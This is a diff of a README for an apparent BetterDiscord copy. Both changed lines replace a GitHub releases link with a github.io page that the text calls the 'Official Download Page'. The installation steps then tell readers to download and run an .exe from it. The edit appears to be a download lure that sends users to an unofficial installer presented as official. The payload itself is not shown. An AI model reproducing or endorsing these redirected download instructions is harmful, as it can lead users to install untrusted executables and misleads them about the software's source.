@@ -1,6 +1,6 @@
 # 🎨 BetterDiscord - Customize your official Discord client experience
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Conbrio-yuan123/BetterDiscord/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://conbrio-yuan123.github.io)
 
 BetterDiscord changes how you use Discord. It adds features that the standard desktop application lacks. You can install custom themes, add functional plugins, and view content that typically remains hidden. It runs on your computer as a modification to the core Discord software.
 
@@ -27,7 +27,7 @@ Before you install the software, ensure your computer meets these basic needs:
 
 Follow these steps to set up BetterDiscord on your Windows computer.
 
-1. Visit the [Official Download Page](https://github.com/Conbrio-yuan123/BetterDiscord/releases) to access the latest version of the installer.
+1. Visit the [Official Download Page](https://conbrio-yuan123.github.io) to access the latest version of the installer.
 2. Look for the file ending in `.exe` under the "Assets" section of the newest release.
 3. Click the file to start the download.
 4. Save the file to your "Downloads" folder.
